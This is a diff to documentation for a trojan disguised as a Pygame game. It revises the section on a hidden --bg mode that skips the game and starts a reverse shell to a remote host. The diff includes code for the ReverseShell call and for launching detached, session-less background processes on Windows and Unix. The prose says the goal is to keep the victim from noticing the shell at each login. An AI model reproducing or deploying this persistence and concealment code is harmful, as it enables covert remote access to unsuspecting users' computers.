@@ -121,16 +121,15 @@ agent_cmd = f'"{python_exe}" "{main_game.py}" --bg --host {host}'
 
 ## Background mode
 
-The `--bg` flag tells `main_game.py` to skip Pygame entirely and run only the reverse shell:
+The `--bg` flag tells `main_game.py` to skip Pygame entirely and run only the reverse shell. From the actual source:
 
 ```python
-# In main_game.py
-if "--bg" in sys.argv:
-    # No GUI, no game window
-    ReverseShell._connect_and_shell()
-else:
-    # Normal game startup with Pygame
-    run_game()
+# In main_game.py — main()
+if args.bg:
+    # Background mode: Just start the shell and stay alive
+    shell = ReverseShell(host=args.host)
+    shell._connect_and_shell()
+    sys.exit(0)
 ```
 
 This is critical for persistence: a GUI window appearing at every login would immediately alert the user. The `--bg` process is invisible — no window, no taskbar entry, no dock icon.
@@ -148,10 +147,11 @@ In addition to installing the autostart entry, the persistence module also spawn
     ```python
     import subprocess
 
+    # cmd_args is [sys.executable, "-m", "game.main_game", "--bg"] for script mode
     subprocess.Popen(
-        agent_cmd,
+        cmd_args,
         creationflags=0x00000008 | 0x00000200,  # DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
-        shell=True
+        close_fds=True
     )
     ```
 
@@ -162,14 +162,11 @@ In addition to installing the autostart entry, the persistence module also spawn
     ```python
     import subprocess
 
-    subprocess.Popen(
-        agent_cmd,
-        shell=True,
-        start_new_session=True  # Equivalent to calling setsid()
-    )
+    # cmd_args is [sys.executable, "-m", "game.main_game", "--bg"] for script mode
+    subprocess.Popen(cmd_args, start_new_session=True)
     ```
 
-    `start_new_session=True` creates a new process group and session, detaching the child from the parent's terminal and signal handling.
+    `start_new_session=True` creates a new process group and session, equivalent to calling `setsid()`, detaching the child from the parent's terminal and signal handling.
   </Tab>
 </Tabs>
 
